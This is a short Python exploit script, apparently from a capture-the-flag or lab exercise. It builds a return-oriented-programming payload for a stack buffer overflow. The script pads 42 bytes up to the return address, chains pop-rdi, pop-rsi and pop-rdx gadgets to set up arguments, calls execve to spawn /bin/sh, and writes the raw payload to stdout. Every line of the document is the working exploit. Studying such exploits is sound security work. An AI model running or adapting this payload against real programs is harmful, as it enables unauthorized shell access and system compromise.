#!/usr/bin/env python3

import sys

# Address of buf (from GDB)
buf_address = 0x7ffffff4121e

# Gadget addresses
pop_rdi = 0x40259f
pop_rsi = 0x40a60e
pop_rdx_rbx = 0x48c7ab
execve_addr = 0x455050

# Build the payload
payload = b"/bin/sh\x00"  # 8 bytes

# Pad to reach return address (42 bytes total, we have 8, need 34 more)
payload += b"A" * 34

# ROP chain starts here (at byte 42, overwrites return address)
payload += pop_rdi.to_bytes(8, "little")
payload += buf_address.to_bytes(8, "little")

payload += pop_rsi.to_bytes(8, "little")
payload += (0).to_bytes(8, "little")

payload += pop_rdx_rbx.to_bytes(8, "little")
payload += (0).to_bytes(8, "little")  # rdx = NULL
payload += (0).to_bytes(8, "little")  # rbx = junk

payload += execve_addr.to_bytes(8, "little")

sys.stdout.buffer.write(payload)